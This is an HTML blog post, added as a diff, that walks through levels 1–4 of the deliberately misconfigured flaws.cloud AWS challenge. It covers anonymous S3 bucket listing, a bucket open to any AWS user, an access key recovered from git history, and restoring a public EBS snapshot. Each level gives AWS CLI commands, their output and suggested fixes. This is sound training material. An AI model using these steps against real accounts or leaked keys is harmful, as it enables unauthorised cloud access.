@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>flAWS.cloud — Rajas Bakshi</title>
+<meta name="description" content="Writeup of flaws.cloud, levels 1 through 4: public S3 buckets, leaked git history, and a public EBS snapshot.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Newsreader:wght@300;400&family=Figtree:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0f0f0f; --ink:#f2f2f2; --text:#bdbdbd; --muted:#858585; --line:#2a2a2a;
+  --code-bg:#161616; --ok:#8fae8f;
+  --serif:"Newsreader",Georgia,serif;
+  --sans:"Figtree",system-ui,sans-serif;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--text);font:400 1.0625rem/1.7 var(--sans);-webkit-font-smoothing:antialiased}
+::selection{background:var(--ink);color:var(--bg)}
+a{color:var(--ink);text-decoration-color:var(--muted);text-underline-offset:4px;text-decoration-thickness:1px}
+a:hover{text-decoration-color:var(--ink)}
+a:focus-visible{outline:2px solid var(--ink);outline-offset:4px;border-radius:2px}
+.page{max-width:60rem;margin:0 auto;padding:0 1.5rem}
+
+.top{display:flex;justify-content:space-between;padding:1.75rem 0}
+.top a{text-decoration:none;color:var(--muted)}
+.top a:hover{color:var(--ink)}
+
+.hero{padding:clamp(2.5rem,8vw,5rem) 0 clamp(2rem,6vw,3rem)}
+h1{font:300 clamp(2.25rem,8vw,4.5rem)/1.05 var(--serif);color:var(--ink);margin:0 0 1rem;letter-spacing:-.02em}
+.lede{font-size:clamp(1.05rem,2vw,1.25rem);line-height:1.55;color:var(--text);max-width:36rem;margin:0}
+.meta{color:var(--muted);font-size:.9rem;margin:1.25rem 0 0}
+
+section{padding:2.75rem 0;border-top:1px solid var(--line)}
+section.level>h2{font:300 2rem/1.2 var(--serif);color:var(--ink);margin:0 0 .35rem}
+.level-url{color:var(--muted);font-size:.9rem;margin:0 0 1.5rem;word-break:break-all}
+.level-url code{background:none;padding:0}
+
+h3{font:500 1.05rem/1.4 var(--sans);color:var(--ink);margin:2rem 0 .6rem;text-transform:none}
+h3:first-of-type{margin-top:0}
+p{margin:0 0 1.1rem;max-width:38rem}
+blockquote{margin:0 0 1.5rem;padding:.2rem 0 .2rem 1.1rem;border-left:2px solid var(--line);color:var(--text);font-style:italic;max-width:36rem}
+
+pre{background:var(--code-bg);border:1px solid var(--line);border-radius:4px;padding:1rem 1.2rem;overflow-x:auto;margin:0 0 1.3rem;max-width:100%}
+code{font:.875rem/1.55 var(--mono);color:var(--text)}
+pre code{color:#d4d4d4}
+.redacted{color:var(--muted)}
+
+.finding-grid{display:grid;grid-template-columns:7rem 1fr;gap:.6rem 1.5rem;margin:1.6rem 0;max-width:40rem}
+.finding-grid dt{color:var(--ink);font-size:.95rem}
+.finding-grid dd{margin:0}
+
+figure{margin:1.5rem 0}
+figure img{display:block;max-width:100%;height:auto;border:1px solid var(--line);border-radius:4px}
+figcaption{color:var(--muted);font-size:.85rem;margin-top:.5rem}
+
+.callout{border:1px solid var(--line);border-radius:4px;padding:1rem 1.3rem;margin:0 0 1.5rem;max-width:40rem}
+.callout p:last-child{margin-bottom:0}
+
+footer{border-top:1px solid var(--line);padding:2rem 0 4rem;color:var(--muted);font-size:.9rem}
+
+@media (max-width:48rem){
+  .finding-grid{grid-template-columns:1fr;gap:.15rem}
+}
+</style>
+</head>
+<body>
+<div class="page">
+  <header class="top">
+    <a href="../../index.html">&larr; Rajas Bakshi</a>
+  </header>
+
+  <main>
+    <div class="hero">
+      <h1>flAWS.cloud</h1>
+      <p class="lede">A walkthrough of flaws.cloud, a deliberately misconfigured AWS environment. Each level is its own S3 bucket or resource, and each one teaches a specific, real-world cloud misconfiguration.</p>
+      <p class="meta">Levels 1&ndash;4 &middot; all challenges run as sub-domains of a single AWS account</p>
+    </div>
+
+    <section class="level" id="level-1">
+      <h2>Level 1 &mdash; Public bucket listing</h2>
+      <p class="level-url"><code>flaws.cloud</code></p>
+
+      <p>The site gives no setup instructions, but the task description's word &ldquo;buckets&rdquo; is a strong hint toward S3.</p>
+
+      <h3>Recon</h3>
+      <p>Resolve the domain to see what's hosting it:</p>
+      <pre><code>nslookup flaws.cloud</code></pre>
+      <pre><code>Non-authoritative answer:
+Name:    flaws.cloud
+Address: 52.92.228.83
+Name:    flaws.cloud
+Address: 3.5.84.3
+...</code></pre>
+      <p>A reverse lookup on one of the returned IPs identifies the hosting service:</p>
+      <pre><code>nslookup 52.92.228.83</code></pre>
+      <pre><code>83.228.92.52.in-addr.arpa  name = s3-website-us-west-2.amazonaws.com.</code></pre>
+      <p>This confirms the site is served from <strong>Amazon S3 static website hosting</strong>, in the <strong>us-west-2</strong> region. S3 custom-domain hosting requires the bucket name to match the domain, so the bucket is <code>s3://flaws.cloud</code>.</p>
+
+      <h3>Exploitation</h3>
+      <p>Try listing the bucket's contents with no credentials at all:</p>
+      <pre><code>aws s3 ls s3://flaws.cloud --no-sign-request --region us-west-2</code></pre>
+      <pre><code>2017-03-14 08:30:38       2575 hint1.html
+2017-03-03 09:35:17       1707 hint2.html
+2017-03-03 09:35:11       1101 hint3.html
+2024-02-22 08:02:41       2861 index.html
+2018-07-10 22:17:16      15979 logo.png
+2017-02-27 07:29:28         46 robots.txt
+2017-02-27 07:29:30       1051 secret-dd02c7c.html</code></pre>
+      <p>The listing succeeds anonymously. <code>secret-dd02c7c.html</code> stands out, and since the bucket serves the website, the object is reachable directly:</p>
+      <pre><code>http://flaws.cloud/secret-dd02c7c.html</code></pre>
+      <pre><code># Congrats! You found the secret file!
+Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code></pre>
+
+      <figure>
+        <img src="img/level1-solved.png" alt="Level 1 solved screen">
+      </figure>
+      <figure>
+        <img src="img/level1-bucket-config.png" alt="Level 1 bucket misconfiguration">
+      </figure>
+
+      <dl class="finding-grid">
+        <dt>Finding</dt><dd>Public bucket listing enabled (anonymous <code>s3:ListBucket</code>).</dd>
+        <dt>Impact</dt><dd>A hidden-by-obscurity file was discoverable purely because the bucket allowed listing, not just reading. In a real environment this could expose backups, configs, or exports.</dd>
+        <dt>Fix</dt><dd>Remove public list access from the bucket policy/ACL, enable S3 Block Public Access, and serve content through CloudFront with the bucket kept private.</dd>
+      </dl>
+    </section>
+
+    <section class="level" id="level-2">
+      <h2>Level 2 &mdash; Open to &ldquo;any authenticated AWS user&rdquo;</h2>
+      <p class="level-url"><code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code></p>
+
+      <p>This level required a real AWS identity rather than an anonymous request, so the CLI was configured with a personal IAM account first.</p>
+      <pre><code>aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code></pre>
+      <pre><code>2017-02-27 07:32:15      80751 everyone.png
+2017-03-03 09:17:17       1433 hint1.html
+2017-02-27 07:34:39       1035 hint2.html
+2017-02-27 07:32:14       2786 index.html
+2017-02-27 07:32:14         26 robots.txt
+2017-02-27 07:32:15       1051 secret-e4443fc.html</code></pre>
+
+      <figure>
+        <img src="img/level2-solved.png" alt="Level 2 solved screen">
+      </figure>
+      <figure>
+        <img src="img/level2-bucket-permissions.png" alt="Level 2 bucket permissions">
+      </figure>
+
+      <dl class="finding-grid">
+        <dt>Finding</dt><dd>The bucket grants access to any authenticated AWS user, not a specific one. An anonymous request fails, but signing with <em>any</em> valid AWS account's credentials succeeds.</dd>
+        <dt>Impact</dt><dd>Anyone holding an AWS account &mdash; not a specific one &mdash; can list and read the bucket's contents.</dd>
+        <dt>Fix</dt><dd>Scope bucket permissions to specific principals rather than the broad &ldquo;any authenticated AWS user&rdquo; group, which is far less restrictive than its name implies.</dd>
+      </dl>
+    </section>
+
+    <section class="level" id="level-3">
+      <h2>Level 3 &mdash; Leaked AWS key via git history</h2>
+      <p class="level-url"><code>level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</code></p>
+      <blockquote>&ldquo;Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.&rdquo;</blockquote>
+
+      <h3>Recon</h3>
+      <pre><code>aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</code></pre>
+      <pre><code>                           PRE .git/
+2017-02-27 05:44:33     123637 authenticated_users.png
+2017-02-27 05:44:34       1552 hint1.html
+2017-02-27 05:44:34       1426 hint2.html
+2017-02-27 05:44:35       1247 hint3.html
+2017-02-27 05:44:33       1035 hint4.html
+2020-05-22 23:51:10       1861 index.html
+2017-02-27 05:44:33         26 robots.txt</code></pre>
+      <p>A <code>.git/</code> directory sitting inside a web-served bucket means the whole repository &mdash; including history &mdash; was deployed by mistake. Deleted files still exist in past commits.</p>
+      <p>Sync the bucket locally and inspect it as a normal git repo:</p>
+      <pre><code>aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./level3
+cd level3/.git
+cat COMMIT_EDITMSG</code></pre>
+      <pre><code>Oops, accidentally added something I shouldn't have</code></pre>
+      <pre><code>cat refs/heads/master</code></pre>
+      <pre><code>b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526</code></pre>
+      <pre><code>git show b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526</code></pre>
+      <pre><code>commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
+Author: 0xdabbad00 &lt;scott@summitroute.com&gt;
+Date:   Sun Sep 17 09:10:43 2017 -0600
+
+    Oops, accidentally added something I shouldn't have
+
+diff --git a/access_keys.txt b/access_keys.txt
+deleted file mode 100644
+index e3ae6dd..0000000
+--- a/access_keys.txt
++++ /dev/null
+@@ -1,2 +0,0 @@
+-access_key AKIAJ366LIPB4IJKT7SA
+-secret_access_key <span class="redacted">[REDACTED]</span></code></pre>
+      <p>The commit that <em>removed</em> the file still shows exactly what was in it &mdash; deleting a secret from the working tree does nothing to erase it from history.</p>
+
+      <h3>Exploitation</h3>
+      <pre><code>aws s3 ls --profile level3AccessKey</code></pre>
+      <pre><code>2017-02-13 03:01:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+2017-05-29 22:04:53 config-bucket-975426262029
+2017-02-13 01:33:24 flaws-logs
+2017-02-05 09:10:07 flaws.cloud
+2017-02-24 07:24:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-26 23:45:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+2017-02-26 23:46:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+2017-02-27 01:14:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+2017-02-27 01:17:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+2017-02-27 01:36:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud</code></pre>
+      <p>The leaked key reveals every bucket in the account, including the next level's.</p>
+      <p class="level-url">Further reading: <a href="https://summitroute.com/blog/2015/12/24/instagram_bounty_case_study_for_defense/" target="_blank" rel="noopener">Instagram bug bounty case study</a></p>
+
+      <dl class="finding-grid">
+        <dt>Finding</dt><dd>AWS credentials were committed to a git repo, then &ldquo;removed&rdquo; in a later commit &mdash; but remained fully recoverable from history. The leaked key granted broad <code>s3:ListBucket</code> access across the account.</dd>
+        <dt>Fix</dt><dd>Revoke any credentials that may have touched version control immediately, regardless of whether they were later removed. Scan repositories for secrets before every commit &mdash; this class of leak is extremely common in real-world codebases.</dd>
+      </dl>
+    </section>
+
+    <section class="level" id="level-4">
+      <h2>Level 4 &mdash; Public EBS snapshot</h2>
+      <p class="level-url"><code>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</code></p>
+      <blockquote>&ldquo;You need to get access to the web page running on an EC2. A snapshot was made of that EC2 shortly after nginx was set up on it.&rdquo;</blockquote>
+
+      <h3>Recon</h3>
+      <p>Using the key from Level 3, identify the account and its backup identity:</p>
+      <pre><code>aws --profile level3AccessKey sts get-caller-identity</code></pre>
+      <pre><code>{
+    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
+    "Account": "975426262029",
+    "Arn": "arn:aws:iam::975426262029:user/backup"
+}</code></pre>
+      <p>List that account's EBS snapshots:</p>
+      <pre><code>aws --profile level3AccessKey ec2 describe-snapshots --owner-id 975426262029 --region us-west-2</code></pre>
+      <pre><code>{
+    "Snapshots": [
+        {
+            "Tags": [{"Key": "Name", "Value": "flaws backup 2017.02.27"}],
+            "SnapshotId": "snap-0b49342abd1bdcb89",
+            "VolumeId": "vol-04f1c039bc13ea950",
+            "State": "completed",
+            "OwnerId": "975426262029",
+            "VolumeSize": 8,
+            "Encrypted": false
+        }
+    ]
+}</code></pre>
+
+      <figure>
+        <img src="img/level4-snapshot-found.png" alt="EBS snapshot discovered">
+      </figure>
+
+      <div class="callout">
+        <p><strong>Background &mdash; EBS snapshots.</strong> An EC2 instance's OS runs on an EBS volume; a snapshot is a point-in-time backup of that volume. Sharing has three levels: <strong>private</strong> (owner only), <strong>shared</strong> (specific accounts), and <strong>public</strong> (anyone can restore it).</p>
+      </div>
+
+      <p>Confirm this snapshot's sharing permissions:</p>
+      <pre><code>aws ec2 describe-snapshot-attribute \
+  --snapshot-id snap-0b49342abd1bdcb89 \
+  --attribute createVolumePermission \
+  --profile level3AccessKey \
+  --region us-west-2</code></pre>
+      <pre><code>{
+    "SnapshotId": "snap-0b49342abd1bdcb89",
+    "CreateVolumePermissions": [{"Group": "all"}]
+}</code></pre>
+      <p><code>Group: all</code> confirms the snapshot is public.</p>
+
+      <h3>Exploitation</h3>
+      <p>Creating a volume with the Level 3 key fails:</p>
+      <pre><code>UnauthorizedOperation: User: arn:aws:iam::975426262029:user/backup is not
+authorized to perform: ec2:CreateVolume ...</code></pre>
+      <div class="callout">
+        <p><strong>Lesson.</strong> The <code>backup</code> account's own IAM permissions and the snapshot's <em>public</em> sharing setting are two separate things. It could discover the snapshot but was never granted <code>ec2:CreateVolume</code>. Since the snapshot is public, any AWS account &mdash; including a personal one &mdash; can act on it directly.</p>
+      </div>
+      <pre><code>aws ec2 create-volume \
+  --snapshot-id snap-0b49342abd1bdcb89 \
+  --availability-zone us-west-2a \
+  --profile iAmAdmin \
+  --region us-west-2</code></pre>
+      <pre><code>{
+    "VolumeId": "vol-0598e67b195f014bb",
+    "AvailabilityZone": "us-west-2a",
+    "State": "creating",
+    "Size": 8,
+    "SnapshotId": "snap-0b49342abd1bdcb89",
+    "Encrypted": false
+}</code></pre>
+      <p>Once the volume is <code>available</code>, attach it to a personal EC2 instance in the same AZ &mdash; a volume can only attach to an instance in its own availability zone:</p>
+      <pre><code>aws ec2 attach-volume \
+  --volume-id vol-0598e67b195f014bb \
+  --instance-id i-0826d0ca277e3705e \
+  --device /dev/sdf \
+  --region us-west-2</code></pre>
+      <p>SSH in and locate the disk &mdash; modern instance types use NVMe naming rather than the requested device name:</p>
+      <pre><code>lsblk</code></pre>
+      <pre><code>NAME          MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS
+nvme0n1       259:0    0   8G  0 disk
+├─nvme0n1p1   259:3    0   8G  0 part /
+nvme1n1       259:1    0   8G  0 disk
+└─nvme1n1p1   259:2    0   8G  0 part</code></pre>
+      <pre><code>sudo mkdir /mnt/snapshot
+sudo mount /dev/nvme1n1p1 /mnt/snapshot</code></pre>
+      <p>Every level in this challenge is a web page, so check the standard nginx web root:</p>
+      <pre><code>cd /mnt/snapshot/var/www/html
+ls
+cat index.html</code></pre>
+      <pre><code>index.html  robots.txt</code></pre>
+      <pre><code>flAWS - Level 5
+
+Good work getting in. This level is described at
+http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</code></pre>
+
+      <dl class="finding-grid">
+        <dt>Finding</dt><dd>A public EBS snapshot of an EC2 root volume allowed full filesystem access &mdash; config, content, everything on disk &mdash; simply by restoring it into any AWS account.</dd>
+        <dt>Fix</dt><dd>Never share EBS snapshots publicly. If cross-account sharing is needed, authorize specific account IDs rather than <code>all</code>, and audit snapshot sharing settings regularly.</dd>
+      </dl>
+    </section>
+
+    <section id="more">
+      <p class="meta">Levels 5 and 6 to follow.</p>
+    </section>
+  </main>
+
+  <footer>&copy; 2026 Rajas Bakshi</footer>
+</div>
+</body>
+</html>
